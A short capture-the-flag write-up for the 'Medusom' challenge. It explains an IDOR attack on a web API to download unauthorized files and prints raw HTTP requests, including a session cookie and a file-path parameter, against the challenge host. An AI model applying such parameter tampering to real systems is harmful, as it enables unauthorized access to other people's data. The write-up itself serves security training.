# Medusom [part 1] - Write up

> I don't have screenshots for this challenge, I'm sorry 😥 I will try my best to explain the challenge !

For this challenge, we need to attack a website to download some data that we are not authorized to see. <br>
To do that, we will exploit an IDOR (Insecure Direct Object Reference).

To download one authorized file via the API, we need to make a POST request containing

```
POST /ajax/listing-post HTTP/1.1
Host: 141.94.222.142:57411
Content-Length: 95
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/mWeqC0lstvYVFQ5Xuy8igsxa
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close

explorer=true&file-download=true&folder-id=1&data-dir=airbus%2FAIRBUS_INTELLIGENCE%2Fdetails.md

GET /ajax/listing-post?file-download=true&folder-id=1&data-dir=airbus%2FAIRBUS_INTELLIGENCE%2Fdetails.md HTTP/1.1
Host: 141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/mWeqC0lstvYVFQ5Xuy8igsxa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close
```
